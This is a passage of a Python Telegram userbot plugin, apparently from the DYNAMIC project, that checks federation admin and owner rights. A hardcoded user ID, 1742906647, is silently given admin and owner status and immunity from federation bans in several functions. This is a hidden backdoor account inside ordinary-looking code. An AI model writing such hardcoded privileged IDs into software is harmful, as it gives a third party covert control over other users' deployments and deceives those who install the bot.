# COPYRIGHT (C) 2021-22 BY LEGENDX22 AND GODBOYX , TEAMLEGEND AND TEAM-DYNAMIC
...
import DYNAMIC.plugins.sql_helper.feds_sql as sql
...
def is_user_fed_admin(fed_id, user_id):
    ...
    if fed_admins is False:
        return False
    if int(user_id) in fed_admins or int(user_id) == OWNER_ID or int(user_id) == 1742906647:
        return True
    else:
        return False
...
def is_user_fed_owner(fed_id, user_id):
    ...
    if str(user_id) == getfedowner or int(user_id) == OWNER_ID or int(user_id) == 1742906647:
        return True
    else:
        return False
...
async def smex_fed(event):
  ...
  if not event.sender_id == int(user) or not event.sender_id == 1742906647:
    ...
    if not event.reply_to_msg_id:
     ...
     try:
        ...
        if input:
          ...
          reason = None
        r_sender_id = iid
    if r_sender_id == BOT_ID or r_sender_id == OWNER_ID or r_sender_id == 1742906647:
